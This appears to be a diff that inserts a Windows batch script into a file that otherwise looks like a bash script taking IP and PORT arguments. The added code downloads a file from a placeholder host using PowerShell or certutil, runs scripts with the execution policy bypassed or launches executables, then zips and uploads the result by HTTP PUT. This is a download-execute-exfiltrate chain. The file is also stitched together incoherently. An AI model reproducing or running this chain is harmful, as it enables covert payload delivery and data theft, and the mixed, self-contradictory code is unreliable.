@@ -5,6 +5,87 @@
 
 ::     (Code is barely tested expect bugs)
 
+@echo off
+setlocal
+
+:: Check for architecture
+if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
+    set ARCH=64
+) else (
+    set ARCH=32
+)
+
+echo Architecture: %ARCH%-bit
+
+:: Check for PowerShell installation
+where powershell >nul 2>&1
+if %errorlevel% neq 0 (
+    set POWERSHELL_INSTALLED=0
+    echo PowerShell is not installed.
+) else (
+    set POWERSHELL_INSTALLED=1
+    echo PowerShell is installed.
+)
+
+:: Define download URL and output file
+set DOWNLOAD_URL=http://example.com/file.zip
+set OUTPUT_FILE=output.zip
+
+:: Download files
+if %POWERSHELL_INSTALLED%==1 (
+    echo Using PowerShell to download files...
+    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%OUTPUT_FILE%'"
+) else (
+    echo Using certutil to download files...
+    certutil -urlcache -split -f "%DOWNLOAD_URL%" "%OUTPUT_FILE%"
+)
+
+:: Check if download was successful
+if exist "%OUTPUT_FILE%" (
+    echo Download successful.
+) else (
+    echo Download failed.
+    exit /b 1
+)
+
+:: Run scripts or executables based on PowerShell installation
+if %POWERSHELL_INSTALLED%==1 (
+    echo Running PowerShell scripts...
+    powershell -ExecutionPolicy Bypass -File script1.ps1
+    powershell -ExecutionPolicy Bypass -File script2.ps1
+) else (
+    echo Running executables...
+    start /wait exe1.exe
+    start /wait exe2.bat
+)
+
+:: Zip the output
+echo Zipping output...
+if exist "%OUTPUT_FILE%" (
+    powershell -Command "Compress-Archive -Path '%OUTPUT_FILE%' -DestinationPath 'final_output.zip'"
+) else (
+    echo No output file to zip.
+    exit /b 1
+)
+
+:: Upload the zip file using HTTP PUT
+set UPLOAD_URL=http://example.com/upload
+echo Uploading final_output.zip...
+if %POWERSHELL_INSTALLED%==1 (
+    powershell -Command "Invoke-WebRequest -Uri '%UPLOAD_URL%' -Method Put -Infile 'final_output.zip'"
+) else (
+    echo Uploading with curl...
+    curl -X PUT --data-binary @final_output.zip "%UPLOAD_URL%"
+)
+
+echo Done.
+endlocal
+
+
+
+
+
+
 :: Keep the required user input minimal for now
 IP=$1
 PORT=$2
